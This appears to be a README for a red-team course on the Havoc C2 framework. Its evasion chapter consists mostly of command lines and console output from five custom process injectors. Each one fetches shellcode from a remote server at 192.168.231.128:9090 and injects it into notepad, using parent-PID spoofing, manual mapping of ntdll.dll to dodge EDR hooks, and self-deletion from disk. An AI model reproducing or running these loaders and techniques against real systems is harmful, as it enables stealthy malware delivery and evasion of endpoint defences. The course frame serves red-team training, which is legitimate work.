# Red Team Ops: Havoc 101
Learn how to compromise an Active Directory Infrastructure by simulating adversarial Tactics, Techniques and Procedures (TTPs) using Havoc Framework. 

## Chapter 1: Intro to C2

## Chapter 2: OPSEC & AV/EDR Evasion
### Runner
```
C:\>Runner.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k

                 /\
                ( ;`~v/~~~ ;._
             ,/'"/^) ' < o\  '".~'\\\--,
           ,/",/W  u '`. ~  >,._..,   )'
          ,/'  w  ,U^v  ;//^)/')/^\;~)'
       ,/"'/   W` ^v  W |;         )/'
     ;''  |  v' v`" W }  \\
    "    .'\    v  `v/^W,) '\)\.)\/)
             `\   ,/,)'   ''')/^"-;'
                  \
                ".
               \    Runner
               
Process Injector 1: Runner (Win32 API)

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -h, --help     Display help screen manual.
  
|--------------
| Payload       : http://192.168.231.128:9090/demon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 4160
| Self Destruct : True
|--------------

[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 12180

[>] Fetching Payload

[>] VirtualAllocEx()
    |-> Base Address: 0x15A89D70000

[>] WriteProcessMemory()
    |-> Shellcode Injected!

[>] VirtualProtectEx()
    |-> Flipping Memory Protection!

[>] CreateRemoteThread()
    |-> Shellcode Executed!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] Runner.exe removed from disk!
```

### Clicker
```
C:\>Clicker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k

       .:'                                  `:.
      ::'                                    `::
     :: :.                                  .: ::
      `:. `:.             .             .:'  .:'
       `::. `::           !           ::' .::'
           `::.`::.    .' ! `.    .::'.::'
             `:.  `::::'':!:``::::'   ::'
             :'*:::.  .:' ! `:.  .:::*`:
            :: HHH::.   ` ! '   .::HHH ::
           ::: `H TH::.  `!'  .::HT H' :::
           ::..  `THHH:`:   :':HHHT'  ..::
           `::      `T: `. .' :T'      ::'
             `:. .   :         :   . .:'
               `::'               `::'
                 :'  .`.  .  .'.  `:
                 :' ::.       .:: `:
                 :' `:::     :::' `:
                  `.  ``     ''  .'
                   :`...........':
                   ` :`.     .': '
                    `:  `"""'  :'   Clicker
                    
Process Injector 2: Clicker (Nt*API)

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -h, --help     Display help screen manual.
  
|--------------
| Payload       : http://192.168.231.128:9090/demon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 4160
| Self Destruct : True
|--------------

[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 13092

[>] Fetching Payload
    |-> Payload retrieved successfully!

[>] NtAllocateVirtualMemory()
    |-> Base Address: 0x23229800000

[>] NtWriteVirtualMemory()
    |-> Shellcode Injected!

[>] NtProtectVirtualMemory()
    |-> Flipping Memory Protection!

[>] NtCreateThreadEx()
    |-> Shellcode Executed!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] Clicker.exe removed from disk!
```

### Bloater
```
C:\>Bloater.exe -f ./Clicker.exe -p 4160 -u http://192.168.231.128:9090/demon.bin -t notepad -s 4160
                                                                    _
                                                                  _( (~\
           _ _                        /                          ( \> > \
       -/~/ / ~\                     :;                \       _  > /(~\/
      || | | /\ ;\                   |l      _____     |;     ( \/    > >
      _\\)\)\)/ ;;;                  `8o __-~     ~\   d|      \      //
     ///(())(__/~;;\                  "88p;.  -. _\_;.oP        (_._/ /
    (((__   __ \\   \                  `>,% (\  (\./)8"         ;:'  i
    )))--`.'-- (( ;,8 \               ,;%%%:  ./V^^^V'          ;.   ;.
    ((\   |   /)) .,88  `: ..,,;;;;,-::::::'_::\   ||\         ;[8:   ;
     )|  ~-~  |(|(888; ..``'::::8888oooooo.  :\`^^^/,,~--._    |88::  |
     |\ -===- /|  \8;; ``:.      oo.8888888888:`((( o.ooo8888Oo;:;:'  |
     |_~-___-~_|   `-\.   `        `o`88888888b` )) 888b88888P""'     ;
     ; ~~~~;~~         "`--_`.       b`888888888;(.,"888b888"  ..::;-'
       ;      ;              ~"-....  b`8888888:::::.`8888. .:;;;''
          ;    ;                 `:::. `:::OOO:::::::.`OO' ;;;''
     :       ;                     `.      "``::::::''    .'
        ;                           `.   \_              /
      ;       ;                       +:   ~~--  `:'  -';
                                       `:         : .::/  - Bloater
          ;                            ;;+_  :::. :..;;;
                                       ;;;;;;,;;;;;;;;,;

Process Injector 3 (Wrapper): Bloater (Process Mitigation Policy)

  -f, --file       Required. Absolute path of file to be executed.

  -p, --parent     Required. Spoof --file under a Parent Process ID.

  -u, --url        Required. Remote URL address for raw shellcode.

  -t, --target     Specify the target/victim process. Default: Self-injection

  -s, --spoof      Spoof --target under a Parent Process ID.

  -h, --help       Display help screen manual.
  
|--------------
| File          : ./Clicker.exe
| PPID Spoofing : 4160
| Argument 1    : http://192.168.231.128:9090/demon.bin
| Argument 2    : notepad
| Argument 3    : 4160
|--------------

[>] CreateProcessW()
    |-> Process Mitigation Policy Enforced!
    |-> Spoofed Parent PID Successfully!
    |-> Target Process Created!
    |-> PID: 19520
```

### RatKing
```
C:\>RatKing.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k

              .'''''-,              ,-`````.
              `-.._  |              |  _..-'
                 \    `,          ,'    /
                 '=   ,/          \,   =`
                 '=   (            )   =`
                .\    /            \    /.
               /  `,.'              `.,'  \
               \   `.                ,'   /
                \    \              /    /
                 \   .`.  __.---. ,`.   /
                  \.' .'``        `. `./
                   \.'  -'''-..     `./
                   /  /        '.      \
                  /  / .--  .-'''`      '.
                 '   |    ,---.    _      \
     /``-----._.-.   \   / ,-. '-'   '.   .-._.-----``\
     \__ .     | :    `.' ((O))   ,-.  \  : |     . __/
      `.  '-...\_`     |   '-'   ((O)) |  '_/...-`  .'
 .----..)    `    \     \      /  '-'  / /    '    (..----.
(o      `.  /      \     \    /\     .' /      \  .'      o)
 ```---..   `.     /`.    '--'  '---' .'\     .'   ..---```
         `-.  `.  /`.  `.           .' .'\  .'  .-'
            `..` /   `.'  ` - - - ' `.'   \ '..'
                /    /                \    \
               /   ,'                  `.   \
               \  ,'`.                .'`.  /
                `/    \              /    \'
                 ,=   (              )   =,
                 ,=   '\            /`   =,
   RatKing       /    .'            `.    \
              .-'''  |                |  ```-.
              `......'                `......'

Process Injector 4: RatKing (Manual Mapping ntdll.dll)

  -u, --url      Required. Remote URL address for raw shellcode.

  -t, --target   Specify the target/victim process. Default: Self-injection

  -p, --parent   Spoof victim process under a Parent Process ID (This option is ignored for self-injection)

  -k, --kill     Enable self-destruct to auto wipe file from disk.

  -h, --help     Display help screen manual.

|--------------
| Payload       : http://192.168.231.128:9090/demon.bin
| Process       : C:\Windows\System32\notepad.exe
| PPID Spoofing : 4160
| Self Destruct : True
|--------------

[>] Resolving Addresses of ntdll.dll
    |-> Original ntdll.dll: 0x7ff856c10000
    |-> New copy of ntdll.dll: 0x1a068730000
    
[>] CreateProcessW()
    |-> Target Process Created!
    |-> PID: 9168

[>] Fetching Payload
    |-> Payload retrieved successfully!

[>] NtAllocateVirtualMemory()
    |-> Base Address: 0x28D20A30000

[>] NtWriteVirtualMemory()
    |-> Shellcode Injected!

[>] NtProtectVirtualMemory()
    |-> Flipping Memory Protection!

[>] NtCreateThreadEx()
    |-> Shellcode Executed!

[>] DeleteProcThreadAttributeList()
    |-> Deleting Process Artifacts!

[>] CloseHandle()
    |-> Closing Process Handle!

[>] CloseHandle()
    |-> Closing Thread Handle!

[>] RatKing.exe removed from disk!
```

### RustKing
```
C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.exe

                    ..:::::::::..
               ..:::aad8888888baa:::..
            .::::d:?88888888888?::8b::::.
          .:::d8888:?88888888??a888888b:::.
        .:::d8888888a8888888aa8888888888b:::.
       ::::dP::::::::88888888888::::::::Yb::::
      ::::dP:::::::::Y888888888P:::::::::Yb::::
     ::::d8:::::::::::Y8888888P:::::::::::8b::::
    .::::88::::::::::::Y88888P::::::::::::88::::.
    :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
    :::::::Y88888888888P::|::Y88888888888P:::::::
    ::::::::::::::::888:::|:::888::::::::::::::::
    `:::::::::::::::8888888888888b::::::::::::::'
     :::::::::::::::88888888888888::::::::::::::
      :::::::::::::d88888888888888:::::::::::::
       ::::::::::::88::88::88:::88::::::::::::
        `::::::::::88::88::88:::88::::::::::'
          `::::::::88::88::P::::88::::::::'
            `::::::88::88:::::::88::::::'
               ``:::::::::::::::::::''
    OffensiveRust   ``:::::::::''    RatKing

[>] Scanning for notepad.exe...
    |-> Found process!
    |-> PID: 11588

[>] Fetching Payload!
    |-> URL: http://192.168.231.128:9090/demon.bin

[>] Resolving Addresses of ntdll.dll
    |-> Original ntdll.dll: 0x7FF856C10000
    |-> New copy of ntdll.dll: 0x1869DB30000

[>] NtAllocateVirtualMemory()
    |-> Base Address: 0x1ED3C1F0000

[>] NtWriteVirtualMemory()
    |-> Shellcode Injected!

[>] NtProtectVirtualMemory()
    |-> Flipping Memory Protection!

[>] NtCreateThreadEx()
    |-> Shellcode Executed!
```
